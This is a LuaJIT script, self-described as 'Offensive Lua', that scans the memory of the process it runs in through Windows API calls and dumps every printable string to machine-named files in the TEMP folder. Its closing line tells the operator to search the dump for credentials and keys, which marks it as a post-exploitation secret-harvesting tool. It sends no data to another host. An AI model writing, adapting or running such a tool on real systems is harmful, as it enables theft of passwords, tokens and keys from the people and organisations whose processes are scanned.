-- memorysearch_stringdump.lua - Memory string extractor for Offensive Lua
-- Extracts ALL printable ASCII strings (5+ characters) from process memory
-- Outputs to: MACHINENAME_STRINGDUMP_PID_TIMESTAMP.txt

local jit = require("jit")
jit.off(true, true)

local ffi = require("ffi")
local bit = require("bit")

-- === Configuration ===
local MIN_STRING_LENGTH = 5  -- Minimum string length to extract
local CHUNK_SIZE = 0x1000
local ADDRESS_LIMIT = 0x7FFFFFFFFFFFFFFF
local MAX_REGIONS_TO_SCAN = 10000

ffi.cdef[[
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned long DWORD;
typedef unsigned long ULONG;
typedef long NTSTATUS;
typedef uintptr_t SIZE_T;
typedef void* HANDLE;
typedef void* PVOID;
typedef int BOOL;
typedef long LONG;
typedef char* LPSTR;
typedef DWORD* PDWORD;
typedef SIZE_T ULONG_PTR;

typedef struct {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    DWORD __alignment1;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
    DWORD __alignment2;
} MEMORY_BASIC_INFORMATION64, *PMEMORY_BASIC_INFORMATION64;

typedef MEMORY_BASIC_INFORMATION64 MEMORY_BASIC_INFORMATION;

BOOL QueryFullProcessImageNameA(HANDLE hProcess, DWORD dwFlags, LPSTR lpExeName, PDWORD lpdwSize);
HANDLE GetCurrentProcess(void);
DWORD GetCurrentProcessId(void);
SIZE_T VirtualQueryEx(HANDLE hProcess, PVOID lpAddress, PVOID lpBuffer, SIZE_T dwLength);
DWORD GetLastError(void);
BOOL CloseHandle(HANDLE hObject);
HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
BOOL ReadProcessMemory(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
DWORD GetCurrentThreadId(void);
DWORD GetEnvironmentVariableA(const char* lpName, char* lpBuffer, DWORD nSize);
DWORD GetComputerNameA(char* lpBuffer, DWORD* nSize);
]]

local kernel32 = ffi.load("kernel32")

-- === Constants ===
local PROCESS_QUERY_INFORMATION = 0x0400
local PROCESS_VM_READ = 0x0010
local MEM_COMMIT = 0x1000
local PAGE_NOACCESS = 0x01
local PAGE_GUARD = 0x100
local PAGE_READONLY = 0x02
local PAGE_READWRITE = 0x04
local PAGE_EXECUTE_READ = 0x20
local PAGE_EXECUTE_READWRITE = 0x40
local PAGE_WRITECOPY = 0x08
local PAGE_EXECUTE_WRITECOPY = 0x80

-- === Utility Functions ===
local function getMachineName()
    local buffer = ffi.new("char[?]", 260)
    local size = ffi.new("DWORD[1]", 260)
    local result = kernel32.GetComputerNameA(buffer, size)
    if result ~= 0 then
        return ffi.string(buffer)
    end
    return "UNKNOWN"
end

local function getTempPath()
    local buffer = ffi.new("char[?]", 260)
    local size = kernel32.GetEnvironmentVariableA("TEMP", buffer, 260)
    if size > 0 and size < 260 then
        return ffi.string(buffer)
    end
    return "."
end

local function generateLogPaths(pid)
    local tempPath = getTempPath()
    local machineName = getMachineName()
    local timestamp = os.date("%Y%m%d_%H%M%S")
    
    local logPath = string.format("%s\\%s_STRINGDUMP_PID%d_%s.log", tempPath, machineName, pid, timestamp)
    local txtPath = string.format("%s\\%s_STRINGDUMP_PID%d_%s.txt", tempPath, machineName, pid, timestamp)
    
    return logPath, txtPath
end

local function isReadableProtection(protect)
    if bit.band(protect, PAGE_NOACCESS) ~= 0 then return false end
    if bit.band(protect, PAGE_GUARD) ~= 0 then return false end
    return bit.band(protect, bit.bor(PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, 
                                     PAGE_EXECUTE_READWRITE, PAGE_WRITECOPY, PAGE_EXECUTE_WRITECOPY)) ~= 0
end

local function safeRead(processHandle, address, size)
    if not processHandle or not address or not size or size <= 0 then
        return nil
    end
    
    local buffer = ffi.new("uint8_t[?]", size)
    local bytesRead = ffi.new("SIZE_T[1]")
    
    local success = kernel32.ReadProcessMemory(
        processHandle,
        ffi.cast("PVOID", address),
        buffer,
        size,
        bytesRead
    )
    
    if success == 0 or bytesRead[0] == 0 then
        return nil
    end
    
    return ffi.string(buffer, bytesRead[0])
end

-- Extract all printable strings from binary data
local function extractStrings(data, baseAddr, minLength)
    local strings = {}
    local currentString = {}
    local currentStart = nil
    
    for i = 1, #data do
        local byte = data:byte(i)
        -- Check if printable ASCII (space to ~)
        if byte >= 32 and byte <= 126 then
            if not currentStart then
                currentStart = i
            end
            table.insert(currentString, string.char(byte))
        else
            -- Non-printable character, end current string if long enough
            if #currentString >= minLength then
                local offset = currentStart - 1
                local addr = baseAddr + offset
                table.insert(strings, {
                    address = addr,
                    value = table.concat(currentString)
                })
            end
            currentString = {}
            currentStart = nil
        end
    end
    
    -- Don't forget the last string if it ends at data end
    if #currentString >= minLength then
        local offset = currentStart - 1
        local addr = baseAddr + offset
        table.insert(strings, {
            address = addr,
            value = table.concat(currentString)
        })
    end
    
    return strings
end

-- Scan a memory region and extract strings
local function scanRegion(processHandle, txtFile, logFile, baseAddr, regionSize, stats)
    local regionEnd = baseAddr + regionSize
    local offset = 0
    local stringsFound = 0
    local chunksRead = 0
    local maxChunks = math.ceil(regionSize / CHUNK_SIZE)
    
    -- Safety limit: don't scan regions larger than 100MB in one go
    if regionSize > 100 * 1024 * 1024 then
        logFile:write(string.format("  -> Region too large (%d MB), skipping\n", math.floor(regionSize / 1024 / 1024)))
        logFile:flush()
        return 0
    end
    
    while offset < regionSize and chunksRead < maxChunks do
        local toRead = math.min(CHUNK_SIZE, regionSize - offset)
        local readAddr = baseAddr + offset
        
        local data = safeRead(processHandle, readAddr, toRead)
        chunksRead = chunksRead + 1
        
        if data and #data > 0 then
            local strings = extractStrings(data, readAddr, MIN_STRING_LENGTH)
            
            for _, str in ipairs(strings) do
                txtFile:write(string.format("0x%016X: %s\n", str.address, str.value))
                stringsFound = stringsFound + 1
                stats.totalStrings = stats.totalStrings + 1
                
                -- Flush every 100 strings to ensure data is written
                if stringsFound % 100 == 0 then
                    txtFile:flush()
                end
            end
        end
        
        offset = offset + toRead
    end
    
    return stringsFound
end

-- Main execution
local function main()
    print("=============================================================")
    print("  Memory String Dump - Extract All Strings from Process")
    print("=============================================================")
    
    local pid = kernel32.GetCurrentProcessId()
    local processHandle = kernel32.GetCurrentProcess()
    
    print(string.format("\nProcess ID: %d", pid))
    print(string.format("Machine: %s", getMachineName()))
    
    local logPath, txtPath = generateLogPaths(pid)
    
    print(string.format("\nLog file: %s", logPath))
    print(string.format("String dump file: %s", txtPath))
    
    local logFile = io.open(logPath, "w")
    local txtFile = io.open(txtPath, "w")
    
    if not logFile or not txtFile then
        print("ERROR: Failed to create output files")
        if logFile then logFile:close() end
        if txtFile then txtFile:close() end
        return
    end
    
    -- Write headers
    logFile:write(string.format("=== Memory String Dump ===\n"))
    logFile:write(string.format("Machine: %s\n", getMachineName()))
    logFile:write(string.format("Process ID: %d\n", pid))
    logFile:write(string.format("Timestamp: %s\n", os.date("%Y-%m-%d %H:%M:%S")))
    logFile:write(string.format("Minimum string length: %d\n\n", MIN_STRING_LENGTH))
    logFile:flush()
    
    txtFile:write(string.format("# Memory String Dump - %s\n", os.date("%Y-%m-%d %H:%M:%S")))
    txtFile:write(string.format("# Machine: %s | PID: %d | MinLength: %d\n", getMachineName(), pid, MIN_STRING_LENGTH))
    txtFile:write(string.format("# Format: ADDRESS: STRING\n\n"))
    txtFile:flush()
    
    print("Output files created and initialized successfully")
    
    local stats = {
        totalRegions = 0,
        readableRegions = 0,
        scannedRegions = 0,
        totalStrings = 0,
        totalBytes = 0
    }
    
    local address = 0x10000
    local use32bitStruct = false
    
    print("\nScanning memory regions...")
    print(string.format("Minimum string length: %d characters\n", MIN_STRING_LENGTH))
    
    logFile:flush()
    txtFile:flush()
    
    -- Main memory scan loop
    while address < ADDRESS_LIMIT and stats.totalRegions < MAX_REGIONS_TO_SCAN do
        local mbi = ffi.new("MEMORY_BASIC_INFORMATION")
        local result = kernel32.VirtualQueryEx(processHandle, ffi.cast("PVOID", address), mbi, ffi.sizeof(mbi))
        
        if result == 0 then
            local err = kernel32.GetLastError()
            logFile:write(string.format("\n[VirtualQueryEx failed at 0x%016X, error=%d]\n", address, err))
            logFile:flush()
            break
        end
        
        local baseAddr = tonumber(ffi.cast("intptr_t", mbi.BaseAddress))
        local regionSize = tonumber(mbi.RegionSize)
        local state = tonumber(mbi.State)
        local protect = tonumber(mbi.Protect)
        
        stats.totalRegions = stats.totalRegions + 1
        
        -- Debug output every 100 regions
        if stats.totalRegions % 100 == 0 then
            print(string.format("Progress: %d regions | %d readable | %d strings", 
                stats.totalRegions, stats.readableRegions, stats.totalStrings))
            logFile:write(string.format("[Progress] %d regions queried, %d readable, %d strings\n", 
                stats.totalRegions, stats.readableRegions, stats.totalStrings))
            logFile:flush()
            txtFile:flush()
        end
        
        if not baseAddr or not regionSize or regionSize == 0 then
            logFile:write(string.format("[WARN] Invalid region data at 0x%016X\n", address))
            address = (baseAddr or address) + 0x1000
        else
            if state == MEM_COMMIT and isReadableProtection(protect) then
                stats.readableRegions = stats.readableRegions + 1
                stats.totalBytes = stats.totalBytes + regionSize
                
                -- Detailed progress for readable regions
                if stats.readableRegions % 10 == 0 then
                    print(string.format("Scanning region %d: 0x%016X (size=%d KB) - %d strings so far", 
                        stats.readableRegions, baseAddr, math.floor(regionSize / 1024), stats.totalStrings))
                end
                
                logFile:write(string.format("[REGION %d] 0x%016X - 0x%016X (size=%d KB, protect=0x%03X)\n",
                    stats.readableRegions, baseAddr, baseAddr + regionSize, math.floor(regionSize / 1024), protect))
                logFile:flush()
                
                local stringsFound = scanRegion(processHandle, txtFile, logFile, baseAddr, regionSize, stats)
                stats.scannedRegions = stats.scannedRegions + 1
                
                if stringsFound > 0 then
                    logFile:write(string.format("  -> Extracted %d strings\n", stringsFound))
                    logFile:flush()
                end
            end
            
            address = baseAddr + regionSize
        end
        
        -- Safety check for address wraparound
        if address < baseAddr then
            logFile:write("\n[ERROR] Address wraparound detected, aborting\n")
            logFile:flush()
            break
        end
    end
    
    -- Write summary
    print("\nWriting summary...")
    logFile:write("\n=== SUMMARY ===\n")
    logFile:write(string.format("Total regions queried: %d\n", stats.totalRegions))
    logFile:write(string.format("Readable regions: %d\n", stats.readableRegions))
    logFile:write(string.format("Scanned regions: %d\n", stats.scannedRegions))
    logFile:write(string.format("Total memory scanned: %.2f MB\n", stats.totalBytes / 1024 / 1024))
    logFile:write(string.format("Total strings extracted: %d\n", stats.totalStrings))
    logFile:write(string.format("String dump saved to: %s\n", txtPath))
    logFile:flush()
    
    txtFile:flush()
    logFile:close()
    txtFile:close()
    
    print("\n=============================================================")
    print("  String Dump Complete")
    print("=============================================================")
    print(string.format("Total regions: %d", stats.totalRegions))
    print(string.format("Readable regions: %d", stats.readableRegions))
    print(string.format("Memory scanned: %.2f MB", stats.totalBytes / 1024 / 1024))
    print(string.format("Strings extracted: %d", stats.totalStrings))
    print(string.format("\nLog saved to: %s", logPath))
    print(string.format("Strings saved to: %s", txtPath))
    print("\nYou can now grep/search the .txt file for credentials, keys, etc.")
end

-- Execute with error handling
local ok, err = pcall(main)
if not ok then
    print(string.format("\nFATAL ERROR: %s", tostring(err)))
    print(debug.traceback())
    os.exit(1)
end
